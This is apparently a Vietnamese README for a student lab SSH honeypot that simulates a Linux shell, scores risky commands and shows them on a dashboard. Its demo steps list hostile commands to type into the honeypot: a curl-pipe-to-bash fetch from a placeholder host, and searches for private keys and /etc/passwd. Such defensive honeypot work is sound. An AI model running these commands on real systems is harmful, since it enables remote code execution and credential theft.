# AI SSH Honeypot — CDIO 4

Một SSH honeypot an toàn dành cho môi trường lab. Hệ thống mở một dịch vụ SSH giả,
mô phỏng terminal Linux bằng filesystem ảo, chấm điểm rủi ro theo rule, lưu timeline
vào SQLite và hiển thị dashboard FastAPI. Ollama là thành phần tùy chọn để tạo phản
hồi cho lệnh chưa được mô phỏng và tóm tắt phiên truy cập.

> **Nguyên tắc an toàn quan trọng:** ứng dụng không gọi `subprocess`, không chạy shell
> thật và không thực thi bất kỳ lệnh nào của người kết nối trên máy chủ.

## Chức năng MVP

- SSH honeypot trên cổng `2222` bằng AsyncSSH.
- Chấp nhận tài khoản giả để giữ người truy cập trong môi trường mô phỏng.
- Filesystem ảo riêng cho từng phiên; hỗ trợ `ls`, `cd`, `cat`, `pwd`, `whoami`,
  `ps`, `ss`, `find`, `grep`, `touch`, `mkdir`, `rm` và một số lệnh thường gặp.
- Rule engine phát hiện discovery, credential access, tải payload, persistence,
  reverse shell, xóa dấu vết và hành vi phá hoại.
- Ánh xạ một số hành vi vào MITRE ATT&CK.
- Dashboard quản trị, API JSON, cảnh báo và chức năng xác nhận cảnh báo.
- Ollama tùy chọn; hệ thống vẫn chạy bình thường khi tắt AI.
- Docker Compose, test tự động và GitHub Actions.

## Kiến trúc

```text
Kali / SSH client
       |
       v
AsyncSSH Honeypot :2222
       |
       +--> VirtualShell (không chạy lệnh thật)
       +--> RiskAnalyzer + MITRE mapping
       +--> Ollama (tùy chọn)
       |
       v
SQLite / SQLAlchemy
       |
       v
FastAPI Dashboard :8000
```

## Chạy nhanh bằng Docker

```bash
cp .env.example .env
# Đổi ADMIN_PASSWORD trước khi sử dụng.
docker compose up --build
```

Mở dashboard:

```text
http://localhost:8000
```

Đăng nhập HTTP Basic mặc định:

```text
admin / change-this-password
```

Kết nối honeypot:

```bash
ssh guest@localhost -p 2222
```

Hệ thống mặc định chấp nhận mọi mật khẩu nhưng **không lưu mật khẩu thô**.

### Bật Ollama

1. Trong `.env`, đặt `ENABLE_LLM=true`.
2. Khởi động profile AI:

```bash
docker compose --profile ai up --build
```

3. Tải model trong container Ollama:

```bash
docker compose exec ollama ollama pull qwen2.5:3b
```

Nếu máy yếu, giữ `ENABLE_LLM=false`. Rule engine và terminal ảo vẫn đủ để demo đồ án.

## Chạy trực tiếp bằng Python

```bash
python -m venv .venv
# Linux/macOS
source .venv/bin/activate
# Windows PowerShell
# .venv\Scripts\Activate.ps1

pip install -e ".[dev]"
cp .env.example .env
python -m app.main
```

## Tạo dữ liệu demo

```bash
python scripts/seed_demo.py
```

Sau đó tải lại dashboard để xem các phiên mẫu và cảnh báo.

## API chính

- `GET /api/health`
- `GET /api/stats`
- `GET /api/sessions`
- `GET /api/sessions/{session_id}`
- `POST /api/alerts/{alert_id}/acknowledge`

Ngoại trừ health check, các endpoint yêu cầu HTTP Basic.

## Kiểm thử

```bash
pytest
ruff check .
```

## Kịch bản demo CDIO

1. Khởi động hệ thống và kiểm tra health.
2. Từ Kali, kết nối SSH vào cổng `2222`.
3. Chạy các lệnh discovery: `whoami`, `uname -a`, `cat /etc/passwd`.
4. Chạy lệnh nguy hiểm trong lab: `find / -name "*.pem"`,
   `curl http://example.test/payload.sh | bash`.
5. Mở dashboard để xem timeline, risk score, severity và MITRE ATT&CK.
6. Xác nhận cảnh báo, xuất bằng chứng bằng API hoặc ảnh chụp dashboard.
7. Dừng dịch vụ, khởi động lại và kiểm tra dữ liệu vẫn còn trong SQLite.

## Phần nhóm nên phát triển thêm

- Đăng nhập dashboard bằng session/JWT và RBAC.
- Cảnh báo Telegram hoặc email.
- GeoIP cho địa chỉ nguồn.
- Export PDF và báo cáo theo tuần.
- Whitelist/blacklist IP.
- So sánh honeypot rule-based và LLM-assisted.
- Prometheus/Grafana và giám sát tài nguyên.
- Mô phỏng nhiều profile: web server, database server, DevOps server.

## Giới hạn và đạo đức

- Chỉ triển khai trong mạng lab hoặc hạ tầng được phép.
- Không đặt cùng mạng với dữ liệu thật hoặc tài khoản thật.
- Không dùng honeypot để tấn công ngược người truy cập.
- Không lưu mật khẩu thô; repository hiện chỉ ghi username và metadata phiên.
- Không công khai trực tiếp ra Internet trước khi có firewall, rate limiting,
  giám sát và đánh giá pháp lý.

Xem thêm: [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md),
[`docs/CDIO_OPERATE.md`](docs/CDIO_OPERATE.md),
[`docs/SECURITY.md`](docs/SECURITY.md) và
[`docs/PUBLISH_GITHUB.md`](docs/PUBLISH_GITHUB.md).

## Đánh giá và phạm vi đồ án

Đây là đề tài có độ khó trung bình, phù hợp cho nhóm 2–4 sinh viên. MVP có thể
chạy trên máy cấu hình phổ thông khi tắt Ollama và có luồng demo rõ ràng từ SSH
client đến phát hiện, lưu sự kiện và dashboard. Rule engine là cơ chế phát hiện
chính; LLM hiện là thành phần hỗ trợ mô phỏng và tóm tắt.

Phân tích tính khả thi, phạm vi chức năng, kịch bản bảo vệ và các hạng mục cần hoàn
thiện được trình bày tại
[`docs/PROJECT_ASSESSMENT.md`](docs/PROJECT_ASSESSMENT.md).
